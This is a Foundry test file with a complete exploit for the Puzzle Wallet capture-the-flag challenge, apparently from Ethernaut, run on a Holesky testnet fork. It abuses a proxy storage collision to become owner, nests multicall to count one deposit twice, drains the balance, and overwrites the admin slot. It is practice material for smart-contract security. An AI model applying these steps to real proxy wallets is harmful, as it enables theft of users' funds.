// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";

// 题目的源代码编译无法通过，就不粘贴源码到src中了，直接在这里写需要的接口就可进行测试
interface IPuzzleWallet {
    function admin() external view returns (address);

    function proposeNewAdmin(address _newAdmin) external;

    function setMaxBalance(uint256 _maxBalance) external;

    function addToWhitelist(address addr) external;

    function multicall(bytes[] calldata data) external payable;

    function deposit() external payable;

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable;
}

contract PuzzleWalletAttack is Test {
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("holesky"));
    }

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;
        address instanceAddress = 0x8385d326978a6558a97744352016d324F93d1196;
        uint256 initValue = 0.001 ether;

        vm.startPrank(playerAddress, playerAddress);
        IPuzzleWallet iPuzzleWallet = IPuzzleWallet(instanceAddress);
        iPuzzleWallet.proposeNewAdmin(playerAddress);
        iPuzzleWallet.addToWhitelist(playerAddress);
        bytes[] memory depositData = new bytes[](1);
        depositData[0] = abi.encodeWithSelector(iPuzzleWallet.deposit.selector);
        bytes[] memory data = new bytes[](2);
        data[0] = depositData[0];
        data[1] = abi.encodeWithSelector(
            iPuzzleWallet.multicall.selector,
            depositData
        );

        iPuzzleWallet.multicall{value: initValue}(data);
        iPuzzleWallet.execute(playerAddress, 2 * initValue, "");
        iPuzzleWallet.setMaxBalance(uint256(uint160(address(playerAddress))));
        vm.stopPrank();

        assertTrue(iPuzzleWallet.admin() == playerAddress);
    }
}
